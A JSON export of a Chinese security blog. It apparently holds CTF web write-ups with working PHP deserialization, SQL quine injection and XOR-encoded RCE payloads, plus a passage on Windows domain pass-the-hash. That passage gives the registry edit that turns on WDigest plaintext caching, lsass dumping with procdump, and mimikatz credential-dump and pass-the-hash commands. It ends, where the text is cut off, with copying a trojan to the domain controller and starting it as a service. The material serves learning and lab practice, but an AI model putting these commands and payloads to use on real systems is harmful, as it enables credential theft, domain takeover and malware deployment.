{"meta":{"title":"清风菀月轩","subtitle":"","description":"个人博客","author":"Qingwan","url":"https://qingwan.top","root":"/"},"pages":[{"title":"","date":"2023-10-13T09:43:01.339Z","updated":"2023-10-13T09:42:51.498Z","comments":true,"path":"404.html","permalink":"https://qingwan.top/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"categories","date":"2023-10-13T09:41:48.000Z","updated":"2024-01-08T07:13:43.346Z","comments":true,"path":"categories/index.html","permalink":"https://qingwan.top/categories/index.html","excerpt":"","text":"CTF做题wp 渗透 代码审计 随笔 生活"},{"title":"friends","date":"2023-10-13T09:42:13.000Z","updated":"2023-10-13T09:42:13.987Z","comments":true,"path":"friends/index.html","permalink":"https://qingwan.top/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-10-13T09:41:59.000Z","updated":"2024-01-08T07:15:06.397Z","comments":true,"path":"tags/index.html","permalink":"https://qingwan.top/tags/index.html","excerpt":"","text":"web ctf 玩玩玩~ 永远热爱生活 爱好：睡觉"},{"title":"","date":"2024-01-08T06:07:54.403Z","updated":"2024-01-08T06:07:54.403Z","comments":true,"path":"about/index.html","permalink":"https://qingwan.top/about/index.html","excerpt":"","text":"煮播是一个喜欢生活，热爱分享的小菜鸡。平时喜欢到处玩，在玩的同时喜欢记录生活，所以还蛮喜欢拍照滴现在在学信息安全，目前的方向是web方向，如果有师傅想和我讨论或者文章中有什么错误，欢迎各位师傅留言斧正！ 最后希望所有看到这的师傅以后都越来越好~"}],"posts":[{"title":"NSSCTF刷题记录⑥--web","slug":"nss⑥","date":"2024-01-16T13:39:16.358Z","updated":"2024-01-16T13:43:37.828Z","comments":true,"path":"2024/01/16/nss⑥/","link":"","permalink":"https://qingwan.top/2024/01/16/nss%E2%91%A5/","excerpt":"比较基础的一些web题⑥","text":"比较基础的一些web题⑥ [HNCTF 2022 Week1]Interesting_httphttp伪造NSSCTF&#123;b77de8fa-f474-46c4-b7f1-5b98e61f188d&#125; [GKCTF 2021]easycms打开链接，发现是禅知7.7cmshttps://blog.csdn.net/LYJ20010728/article/details/120005727复现一下这个漏洞题目上是一个静态页面，没有什么跳转扫描到了后台网站admin.php用户名密码爆破为admin和12345看到设计页面可以导出主题导出一个看一下复制一下下载链接http://node4.anna.nssctf.cn:28861/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA=把后面的Base64解码一下/var/www/html/system/tmp/theme/default/1.zip那我们换一个呢，假设换成/flag即http://node4.anna.nssctf.cn:28861/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=然后下载了一个zip文件，但是不能打开，把后缀改成php或者txt之后，即可得到flagNSSCTF&#123;2a3e11c5-9011-40e0-83d2-9acaa9407291&#125; [第五空间 2021]pklovecloud123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 &lt;?php include &#x27;flag.php&#x27;;class pkshow &#123; function echo_name() &#123; return &quot;Pk very safe^.^&quot;; &#125; &#125; class acp &#123; protected $cinder; public $neutron; public $nova; function __construct() &#123; $this-&gt;cinder = new pkshow; &#125; function __toString() &#123; if (isset($this-&gt;cinder)) return $this-&gt;cinder-&gt;echo_name(); &#125; &#125; class ace&#123; public $filename; public $openstack; public $docker; function echo_name() &#123; $this-&gt;openstack = unserialize($this-&gt;docker); $this-&gt;openstack-&gt;neutron = $heat; if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) &#123; $file = &quot;./&#123;$this-&gt;filename&#125;&quot;; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return &quot;keystone lost~&quot;; &#125; &#125; &#125; &#125; if (isset($_GET[&#x27;pks&#x27;])) &#123; $logData = unserialize($_GET[&#x27;pks&#x27;]); echo $logData; &#125; else &#123; highlight_file(__file__); &#125;?&gt; 网上有一篇wp写的很详细：https://www.ctfer.vip/note/set/2527开头看到了flag.php函数，接下来就去找找有没有什么危险函数可以让我们读取flag.php的内容。我们发现了class ace里面的file_get_contents($file)，即我们只需要让file的值为flag.php即可，接下来就是一步一步的调用了。其实就是要调用echo_name函数，那这个函数又在__toString() 被调用了这里我们就可以总结一下，__toString() 函数什么时候会被调用 __toString() 函数被调用的情况①对一个对象进行print或者echo的时候会触发__toString; ② 声明的变量赋值为对象后与字符串做弱类型比较的时候就能触发__toString ③声明的变量赋值为对象后进行正则匹配的时候就能触发__toString ④声明的变量被赋值为对象后进行strolower的时候就能触发__toString ⑤声明的变量进行实例化的时候就能触发__toString;___toString 的触发方法就是：将对象当作字符串使用 我们会发现 Class acp 中的__construct()构造函数中对$cinder 进行了实例化，而__construct()构造函数在实例化一个对象的时候就会被调用；所以最终的链子为：Class acp :: __construct() -&gt; Class acp :: __toString() -&gt; Class ace :: echo_name()我们分析一下class ace 中的 echo_name() ，我们可以发现需要满足$this-&gt;$openstack-&gt;neutron === $this-&gt;openstack-&gt;nova然后在上面有$this-&gt;$openstack = unserialize($this-&gt;docker)，因此只要我们使得$this-&gt;docker =null，然后让$this-&gt;filename=”flag.php”即可使得上面的判断成立,并且读取 flag.php 的内容，poc如下 123456789101112131415161718192021222324 &lt;?php class acp &#123; protected $cinder; public $neutron; public $nova; function __construct($a) &#123; $this-&gt;cinder = $a; &#125; &#125; class ace&#123; public $filename=&quot;flag.php&quot;; public $openstack; public $docker = null; &#125; $a = new ace;$b = new acp($a);echo urlencode(serialize($b))?&gt; 传参，查看源代码发现flag，不在这里最终poc 123456789101112131415161718192021222324 &lt;?php class acp &#123; protected $cinder; public $neutron; public $nova; function __construct($a) &#123; $this-&gt;cinder = $a; &#125; &#125; class ace&#123; public $filename=&quot;../nssctfasdasdflag&quot;; public $openstack; public $docker = null; &#125; $a = new ace;$b = new acp($a);echo urlencode(serialize($b))?&gt; payload为： 1?pks=O%3A3%3A&quot;acp&quot;%3A3%3A&#123;s%3A9%3A&quot;%00*%00cinder&quot;%3BO%3A3%3A&quot;ace&quot;%3A3%3A&#123;s%3A8%3A&quot;filename&quot;%3Bs%3A19%3A&quot;..%2Fnssctfasdasdflag&quot;%3Bs%3A9%3A&quot;openstack&quot;%3BN%3Bs%3A6%3A&quot;docker&quot;%3BN%3B&#125;s%3A7%3A&quot;neutron&quot;%3BN%3Bs%3A4%3A&quot;nova&quot;%3BN%3B&#125; NSSCTF&#123;76fe8cfb-15cb-497e-a3bc-ecdd8a2c6092&#125; [WUSTCTF 2020]朴实无华扫描一下，发现了robots.txt，然后看到了一个路由，进去这个路由然后抓包访问一下fl4g.php看到源码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;; &#125;else&#123; die(&quot;金钱解决不了穷人的本质问题&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123; $md5=$_GET[&#x27;md5&#x27;]; if ($md5==md5($md5)) echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;; else die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123; $get_flag = $_GET[&#x27;get_flag&#x27;]; if(!strstr($get_flag,&quot; &quot;))&#123; $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;; system($get_flag); &#125;else&#123; die(&quot;快到非洲了&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;?&gt; intval绕过&amp;弱比较md5编码前后值一样这里是一个特性。科学计数法绕过。比如3e1会被认为是3，但是3e3+1会被认为是3001这里的绕过就是也是用科学计数法，但是后面要纯数字所以最后的payload为?num=3e3&amp;md5=0e215962017&amp;get_flag=more$&#123;IFS&#125;f*NSSCTF&#123;acd27fac-8e2a-4ba9-9a17-bed2a60072bb&#125; [SWPUCTF 2022 新生赛]1z_unserialize123456789101112131415161718192021&lt;?php class lyh&#123; public $url = &#x27;NSSCTF.com&#x27;; public $lt; public $lly; function __destruct() &#123; $a = $this-&gt;lt; $a($this-&gt;lly); &#125; &#125;unserialize($_POST[&#x27;nss&#x27;]);highlight_file(__FILE__); ?&gt; 应该是反序列化的签到题直接上poc 123456789101112&lt;?php class lyh&#123; public $url = &#x27;NSSCTF.com&#x27;; public $lt; public $lly;&#125;$a=new lyh;$a-&gt;lt=system;$a-&gt;lly=&quot;cat /f*&quot;;echo serialize($a);?&gt; payload为 1nss=O:3:&quot;lyh&quot;:3:&#123;s:3:&quot;url&quot;;s:10:&quot;NSSCTF.com&quot;;s:2:&quot;lt&quot;;s:6:&quot;system&quot;;s:3:&quot;lly&quot;;s:7:&quot;cat /f*&quot;;&#125; NSSCTF&#123;fc6fe9fc-af30-4420-a63c-ea50b469bf0b&#125; [SWPUCTF 2022 新生赛]where_am_iemmmm脑洞题 有点那个了题目的图片搜索 然后得到店家的电话提交NSSCTF&#123;33652a44-3323-426b-ae94-121f3e969f35&#125; [第五空间 2021]yet_another_mysql_injection点开题目，F12看到提示，拿到源代码 12345678910111213141516171819202122232425262728293031323334353637 &lt;?phpinclude_once(&quot;lib.php&quot;);function alertMes($mes,$url)&#123; die(&quot;&lt;script&gt;alert(&#x27;&#123;$mes&#125;&#x27;);location.href=&#x27;&#123;$url&#125;&#x27;;&lt;/script&gt;&quot;);&#125;function checkSql($s) &#123; if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;,$s))&#123; alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;); &#125;&#125;if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;] != &#x27;&#x27; &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; $_POST[&#x27;password&#x27;] != &#x27;&#x27;) &#123; $username=$_POST[&#x27;username&#x27;]; $password=$_POST[&#x27;password&#x27;]; if ($username !== &#x27;admin&#x27;) &#123; alertMes(&#x27;only admin can login&#x27;, &#x27;index.php&#x27;); &#125; checkSql($password); $sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;; $user_result=mysqli_query($con,$sql); $row = mysqli_fetch_array($user_result); if (!$row) &#123; alertMes(&quot;something wrong&quot;,&#x27;index.php&#x27;); //password不能为空，并且username为admin &#125; if ($row[&#x27;password&#x27;] === $password) &#123; die($FLAG); &#125; else &#123; alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;); //password要和查询到的password相同 &#125;&#125;if(isset($_GET[&#x27;source&#x27;]))&#123; show_source(__FILE__); die;&#125;?&gt; 审计一下代码，可以知道我们在主页要用admin这个用户名登录，然后密码是注入点，但是这里绕过了很多东西这里要求我们传入的username必须为admin，而且我们输入的密码必须和存储的查询的密码相同，才可以登录然后这里的password也用正则绕过了很多东西，从上面的源码可以看到，输入的sql语句查询的数据库为user。那我们这里可以用联合注入进行查询，正则过滤的东西用其他代替就可以了。这里还是无回显，所以我们这里应该用盲注 sql的过滤123456789sleep 可以用benchmark代替 &lt;,&gt; 可以用least(),greatest()代替 =,in 可以用like代替 substr 可以用mid代替空格 可以用/**/代替 quine注入参考文章：https://www.anquanke.com/post/id/253570https://blog.csdn.net/qq_35782055/article/details/130348274 那这里要求的是$sql执行的结果与$password相同，我们本来要满足的条件是我们输入的密码和查询到的密码是相同的，但是这里我们使得我们的输入和输出是一致的，也可以达到效果。Quine又叫做自产生程序，在sql注入技术中，这是一种使得输入的sql语句和输出的sql语句一致的技术，常用于一些特殊的登陆绕过sql注入中。 根据上面的参考文章，我们可以知道Quine注入基本的原理其实就是套娃，可以描述为如下形式 1REPLACE(str,编码的间隔符,str) str可描述为如下形式： 1REPLACE(间隔符,编码的间隔符,间隔符) 这样运算后，最后的结果又是： 1REPLACE(str,编码的间隔符,str) 所以比如这个语句 1REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;,CHAR(46),&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;) 他的输入输出都是不变的 所以这道题，其中1&#39;/**/union/**/select/**/replace(replace(&#39;str&#39;,char(34),char(39)),char(46),&#39;str&#39;)#是Quine的基本形式而str的基本形式为1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#如果char被过滤了，可以使用chr和0x绕过 123char(34),char(39)chr(34),chr(39)0x22,0x27 最后的payload为 1&#x27;/**/union/**/select(REPLACE(REPLACE(&#x27;&quot;/**/union/**/select(REPLACE(REPLACE(&quot;!&quot;,CHAR(34),CHAR(39)),CHAR(33),&quot;!&quot;))#&#x27;,CHAR(34),CHAR(39)),CHAR(33),&#x27;&quot;/**/union/**/select(REPLACE(REPLACE(&quot;!&quot;,CHAR(34),CHAR(39)),CHAR(33),&quot;!&quot;))#&#x27;))# 先用&#39;去闭合password参数里的引号，然后再用联合查询语句，这里还涉及单引号双引号的问题，所以把要先把双引号替换为单引号，再替换一下被正则过滤的那些字符NSSCTF&#123;28c8ada1-d8ed-4a75-af12-f0b0da64ff6e&#125; 这里还有一个非预期解，扫一下后台 1dirsearch -u http://node4.anna.nssctf.cn:28703/ -e* 扫到了/phpmyadmin/ 然后直接admin/admin弱密码登录，最后在user表找到密码，但是我们用注入的时候是在表里查不到密码的，而且这里后面好像把这个非预期给修了 [MoeCTF 2022]baby_file打开环境 123456789101112&lt;html&gt;&lt;title&gt;Here&#x27;s a secret. Can you find it?&lt;/title&gt;&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; include($file);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;&lt;/html&gt; GET传参 1/?file=php://filter/convert.base64-encode/resource=flag.php NSSCTF&#123;70497173-c989-4054-9d6d-417be2cad52e&#125; [SWPUCTF 2022 新生赛]xffhttp头伪造 12X-Forwarded-For: 127.0.0.1Referer: node5.anna.nssctf.cn:28983 NSSCTF&#123;th1s_xff_1s_e4ay&#125; [SWPUCTF 2022 新生赛]numgame这道题f12和开发者模式怎么都打不开源码，最后先在一个网页打开F12，然后再在那个网页访问链接在JS文件源码里发现注释，访问文件NsScTf.php 12345678910111213141516 &lt;?phperror_reporting(0);//hint: 与get相似的另一种请求协议是什么呢include(&quot;flag.php&quot;);class nss&#123; static function ctf()&#123; include(&quot;./hint2.php&quot;); &#125;&#125;if(isset($_GET[&#x27;p&#x27;]))&#123; if (preg_match(&quot;/n|c/m&quot;,$_GET[&#x27;p&#x27;], $matches)) die(&quot;no&quot;); call_user_func($_GET[&#x27;p&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125; 访问一下hint2.php，提示类是nss2 静态方法访问类成员这里的call_user_func函数：把第一个参数作为回调函数调用php是不分大小写的，所以这里可以用大小写绕过，所以这里的payload为： 1p=Nss2::Ctf NSSCTF&#123;51074e32-f061-40f1-b3e3-f06b517f69f9&#125;这里还可以用数组绕过 1p[]=nss2&amp;p[]=ctf [SWPUCTF 2022 新生赛]js_sign查看源代码 12345678document.getElementsByTagName(&quot;button&quot;)[0].addEventListener(&quot;click&quot;, ()=&gt;&#123; flag=&quot;33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15&quot; if (btoa(flag.value) == &#x27;dGFwY29kZQ==&#x27;) &#123; alert(&quot;you got hint!!!&quot;); &#125; else &#123; alert(&quot;fuck off !!&quot;); &#125; &#125;) tapcode敲击码解码提示tapcode是敲击码用在线网站解密一下，记得去掉空格3343431344215434452124331421311122125444113513341415NSSCTF&#123;youfindflagbytapcode&#125; [HUBUCTF 2022 新生赛]HowToGetShell1234567&lt;?phpshow_source(__FILE__);$mess=$_POST[&#x27;mess&#x27;];if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123; die(&quot;invalid input!&quot;);&#125;eval($mess); 无字符RCE–异或看到正则匹配就知道是无字符RCE看下笔记可以用取反，异或，自增绕过。这里用异或绕过POST传参mess=$_=(&#39;%01&#39;^&#39;%60&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%05&#39;^&#39;%60&#39;).(&#39;%09&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7c&#39;);$__=&#39;_&#39;.(&#39;%07&#39;^&#39;%40&#39;).(&#39;%05&#39;^&#39;%40&#39;).(&#39;%09&#39;^&#39;%5d&#39;);$___=$$__;$_($___[_]);对这段payload的理解为：(&#39;%01&#39;^&#39;%60&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%05&#39;^&#39;%60&#39;).(&#39;%09&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7c&#39;);$__=&#39;_&#39;.(&#39;%07&#39;^&#39;%40&#39;).(&#39;%05&#39;^&#39;%40&#39;).(&#39;%09&#39;^&#39;%5d&#39;);$___=$$__;构造函数assert($_GET[_]); 然年$_($___[_])这里调用函数然后GET传参?_=phpinfo();还可以构造POST传参的直接POST传参mess=$_=(&#39;%40&#39;^&#39;%21&#39;).(&#39;%7B&#39;^&#39;%08&#39;).(&#39;%7B&#39;^&#39;%08&#39;).(&#39;%7B&#39;^&#39;%1E&#39;).(&#39;%7E&#39;^&#39;%0C&#39;).(&#39;%7C&#39;^&#39;%08&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;%5D&#39;).(&#39;%0F&#39;^&#39;%40&#39;).(&#39;%0E&#39;^&#39;%5D&#39;).(&#39;%0B&#39;^&#39;%5F&#39;);$___=$$__;$_($___[_]);&amp;_=phpinfo();，然后搜索可得flagNSSCTF&#123;33296b7a-7b34-4eaa-a8e5-8ae3db34fba5&#125; [SWPUCTF 2022 新生赛]ez_ez_unserialize12345678910111213141516171819202122232425&lt;?phpclass X&#123; public $x = __FILE__; function __construct($x) &#123; $this-&gt;x = $x; &#125; function __wakeup() &#123; if ($this-&gt;x !== __FILE__) &#123; $this-&gt;x = __FILE__; &#125; &#125; function __destruct() &#123; highlight_file($this-&gt;x); //flag is in fllllllag.php &#125;&#125;if (isset($_REQUEST[&#x27;x&#x27;])) &#123; @unserialize($_REQUEST[&#x27;x&#x27;]);&#125; else &#123; highlight_file(__FILE__);&#125; 这里的__wakeup魔术方法，会给我们的参数赋值，所以我们需要绕过他，然后这个给x赋值flag所在的文件 __wakeup的绕过所以poc为 12345678&lt;?phpclass X&#123; public $x=fllllllag.php;&#125;$qw = new X;$qw -&gt; x = &#x27;fllllllag.php&#x27;;$wq = serialize($qw);echo ($wq); 得到payload为O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;这里如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，wakeup()的执行会被跳过。所以最后的payload为?x=O:1:&quot;X&quot;:3:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;NSSCTF&#123;a2ffe11f-a95a-49ce-abf0-185b52ab7cc1&#125; [NISACTF 2022]middlerce1234567891011121314151617&lt;?phpinclude &quot;check.php&quot;;if (isset($_REQUEST[&#x27;letter&#x27;]))&#123; $txw4ever = $_REQUEST[&#x27;letter&#x27;]; if (preg_match(&#x27;/^.*([\\w]|\\^|\\*|\\(|\\~|\\`|\\?|\\/| |\\||\\&amp;|!|\\&lt;|\\&gt;|\\&#123;|\\x09|\\x0a|\\[).*$/m&#x27;,$txw4ever))&#123; die(&quot;再加把油喔&quot;); &#125; else&#123; $command = json_decode($txw4ever,true)[&#x27;cmd&#x27;]; checkdata($command); @eval($command); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 这里看到我们最后要执行命令，正则绕过了很多字符，这个正则表达式模式将匹配一个字符串，并且要求该字符串包含字母、数字、下划线或特定的特殊字符。具体来说，它可以匹配包含以下字符之一的字符串：字母、数字、还有那些字符。json_decode() 函数用于将 JSON 格式的字符串转换为 PHP 对象或关联数组。这里要绕过两个地方，第一个是绕过正则表达式，第二个是未知的checkdata函数 PCRE回溯次数限制绕过+php短标签https://www.freebuf.com/articles/web/190794.html、 简单来说，就是我们正则的回溯次数大于100万次，reg_match 返回的非 1 和 0，而是 false。 利用爆破得出checkdata函数绕过了 1assert、flag、cat、tac、php 所以我们RCE的命令为?&gt;&lt;?= tail /f*?&gt; 这里的&lt;?=?&gt;则是利用短标签，相当于&lt;? echo&gt;，?&gt;用于在eval函数时进行闭合，方便我们使用短标签来echo输出结果，反引号用来执行命令。所以最后的脚本为 12345import requestspayload=&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `tail /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27; + &quot;#&quot;*(1000000) + &#x27;&quot;&#125;&#x27; # &#x27;@&#x27;*(1000000) 就是将 @ 字符串重复 1000000 次res = requests.post(&quot;http://node4.anna.nssctf.cn:28922/&quot;, data=&#123;&quot;letter&quot;:payload&#125;)print(res.text) flag为NSSCTF&#123;b305b11e-c003-42a4-9c10-dc6a1e282a1c&#125;","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"域渗透横向移动--pass the hash","slug":"PTH","date":"2024-01-12T04:42:44.700Z","updated":"2024-01-12T04:58:13.641Z","comments":true,"path":"2024/01/12/PTH/","link":"","permalink":"https://qingwan.top/2024/01/12/PTH/","excerpt":"hash传递攻击的相关手法、防御措施及其绕过","text":"hash传递攻击的相关手法、防御措施及其绕过 “Pass the Hash” 攻击是一种通过窃取用户密码的哈希值，而无需获取实际密码的攻击手法。在 Windows 系统中，用户密码通常以哈希值的形式存储，而攻击者可以直接传递这个哈希值来完成认证，绕过传统的口令验证。这种攻击的产生与弱口令、哈希值存储、以及对密码的哈希而非明文存储等因素有关。攻击者利用这一漏洞绕过身份验证，获取对系统和网络资源的访问权限，可能导致敏感信息泄漏和系统被滥用。通过PTH，可以扩大攻击范围，达到横向移动的目的。 哈希传递攻击的前提是域内主机的域管理员密码都为相同的密码，相同的密码对应的哈希值也相同。所以，如果我们拿到另一台主机的本地管理员权限，即使不知道域管理员的密码，也可以用哈希传递来获得管理员权限。 前言在开始分析PTH之前，我们先来思考几个问题： 为什么使用PTH，发明这个攻击手法的原因和目的是什么呢？①首先我们知道，如果获取了明文密码，那我们就可以直接用明文密码进行登录。但是从 Windows Server 2012 r2开始， lsass.exe进程中抓不到明文密码了。微软为了防止用户密码在内存中以明文形式泄露，发布了补丁KB2871997，关闭了Wdigest功能。使攻击者无法从内存中获取明文密码。Windows Server2012以下版本，如果安装了KB2871997补丁，攻击者同样无法获取明文密码。而且安装了 KB2871997补丁，不仅无法dump出明文密码，并且一般情况下无法使用哈希传递攻击。仅可以使用SID&#x3D;500的用户进行哈希传递攻击，而SID&#x3D;500的用户默认为administrator。②可能还会有人有疑问，我们可以使用hash爆破啊。大家都知道windows的认证hash从开始到现在大概分为LM hash和NTLM hash两种。前期的LM hash位数较少，加密方法较简单，我们可以使用爆破试一试。但是从windows 7开始 LM hash就已经被禁用了，普遍使用的是NTLM hash，这种hash使用单向MD4函数穷举，加密方法较复杂，爆破难度大。 在Windows Server 2012 或者安装了KB2871997补丁之后，就真的不能捕获到明文密码了么？答案是否定的。那我们该怎么在有这个补丁的情况下获得明文密码呢呢？更新KB2871997补丁后，Wdigest Auth强制系统的内存不再保存明文口令.但是在实际情况中一些系统服务(例如IIS的SSO身份验证、远程桌面服务)在运行的过程中需要Wdigest Auth开启，所以补丁虽然强制关闭Wdigest Auth，但是我们可以选择是否禁用Wdigest Auth。我们可以先来了解一下，什么是Wdigest Auth Wdigest Auth（Windows Digest Authentication）是 Windows 操作系统中的一种身份验证协议，用于通过摘要（digest）方式进行用户身份验证。该协议的主要目的是增强传统的 NTLM（NT LAN Manager）身份验证的安全性。在 Wdigest Auth 中，用户的密码不会以明文形式在网络上传输。相反，系统会使用一种摘要算法，将密码的摘要信息传递给服务器。这样，即使在网络上截获了数据包，攻击者也难以还原出用户的明文密码。 这里Wdigest Auth 的开启与关闭涉及 Windows 操作系统中 LSA（Local Security Authority，本地安全性机构）的策略，其中的一个重要参数是 UseLogonCredential。 如果 UseLogonCredential 为 1，表示开启 Wdigest Auth，此时系统会在内存中保存用户的明文口令。 如果 UseLogonCredential 为 0，表示关闭 Wdigest Auth，此时系统在内存中不再保存用户的明文口令。 这里一下说用户的密码不会以明文形式在网络上传输，一下又说此时系统会在内存中保存用户的明文口令，是否冲突呢？其实不然，这两句话在描述 Wdigest Auth 的不同方面。 “在 Wdigest Auth 中，用户的密码不以明文形式在网络上传输。” 这句话强调了 Wdigest Auth 的网络传输安全性。即使攻击者截获了网络数据包，由于使用了摘要算法，攻击者很难还原出用户的明文密码。 “如果 UseLogonCredential 为 1，表示开启 Wdigest Auth，此时系统会在内存中保存用户的明文口令。” 这句话描述了 Wdigest Auth 在系统内存中的行为。如果 UseLogonCredential 为 1，系统将保存用户的明文口令以支持 Wdigest Auth 过程。这是为了在用户的会话期间（例如，单一登录或其他服务需要明文密码的情况）提供更高的效率和功能。Wdigest Auth 通过在网络上传输时使用摘要算法，保护了密码的传输安全性，而在内存中保存用户的明文口令则是为了提供在用户会话期间的便利性和功能。 那这里我们就来实验一下吧，我用域内的windows server 2016作为实验机器我们先看一下UseLogonCredential 这个参数有没有打开 1234567将下列注册表路径的HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest以下项的UseLogonCredential值修改成0或10：关闭Wdigest Auth1：启动Wdigest Auth 我们来修改下windows server 2016的注册表，我手动找没有找到UseLogonCredential 这个参数，但是输入下面这个命令可以执行成功，修改之后，将用户administrator注销，然后重新登录 1reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 然后再输入，记得要把病毒防护和防火墙关掉 1procdump64.exe -accepteula -ma lsass.exe lsass.dmp 然后在放在同一目录下执行，记得都要把防火墙和病毒防护全部关掉！！！然后记住要管理员身份运行 123sekurlsa::minidump lsass.dmpprivilege::debug //提权 sekurlsa::logonpasswords //这个命令如果执行的时候报错，可以多执行几次 在没有开启前，我们抓到的密码是hash值 然后在修改之后重新登录得到明文密码 PTH在什么情况下可以用？在上面一个问题里面，我们提到了2014年微软发布了补丁KB2871997，那么这个补丁真的可以防御PTH么？更新KB2871997后，发现无法使用常规的哈希传递方法进行横向移动，但Administrator账号(SID为500)，使用该账号的散列值依然可以进行哈希传递。 在工作组环境中： Windows Vista 之前的机器，可以使用本地管理员组内的用户进行攻击。 Windows Vista 之后的机器，只能是sid&#x3D;500的用户的哈希值才能进行哈希传递攻击在域环境中： 域管理员组内用户的哈希值能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。但是在打了补丁之后，也只有sid&#x3D;500的用户才能进行PTH 那怎么判断当前机器是在域内还是在工作组内呢①查看此电脑的属性选择高级系统设置查看如果是域则代表是域环境，如果是工作组则代表是工作组内②输入systeminfo显示出计算机的操作系统的详细配置信息然后看域这栏是否为空，如果不为空，则在域内 如果我们拿下的这台机器上没有域管的hash怎么办呢？一般得域管登录过我们的机器，我们才能在机器上抓到其hash。但实际上一个域内可能有几百几千台机器，不一定我们拿下的那台机器就有域管的hash。那这时候我们应该怎么办呢？我们一般会先在拿下的这台主机上提权到sid&#x3D;500的管理员用户，然后用域内用户的hash横向移动到其他机器，直到获取到域管的hash为止。但是一般都不会那么容易获取到，都会有防御措施。这时候我们就会用其他横向移动的方法，或者去打一些其他的服务。 复现环境域控：windows server 2016域内主机：windows 10攻击机：kali 在域内进行PTH的前提是： 1.获得一台域主机的权限2.Dump内存获得其hash3.通过PTH尝试登录其他主机4.直到获得域管理员账户hash，登录域控，最终成功控制整个域 PTH攻击实例这里假设我们已经拿下了windows 10，我们就在这台机器上进行PTH攻击因为win10和我的攻击机不在同一个局域网内，所以我这里先代理一下，使得攻击机和win10之间可以相互通信这里记得要把主机和win10的防火墙都关了 ①猕猴桃这里注意ntlm hash dump出来可能有好几个hash，就是登陆过这个计算机的都会有，这里如果实在不知道哪个是域控的，可以都试试，这里记得用管理员权限执行猕猴桃 1234567891011121314privilege::debugsekurlsa::pth /user:administrator /domain:WANYUE /ntlm:cb0a99e1c922b84b1b632df155665470dir \\\\DC01\\c$ //DC01为主机名，通过hostname查看，这里为域控的主机名，这个命令会列举域控的C盘下的目录为了进一步扩大战果，我们还可以把木马上传到域控下copy hack.exe \\\\DC01\\c$ //上传木马hack.exe到域控的C盘下//在域控上创建服务启动木马sc \\\\[computer&#x27;s name.domain name] create [service name] binpath=&quot;[file path]&quot;如：sc \\\\DC01.wanyue.com create update binpath= &quot;c:\\hack.exe&quot;sc \\\\DC01.wanyue.com start update // 在域控上立即启动该服务sc 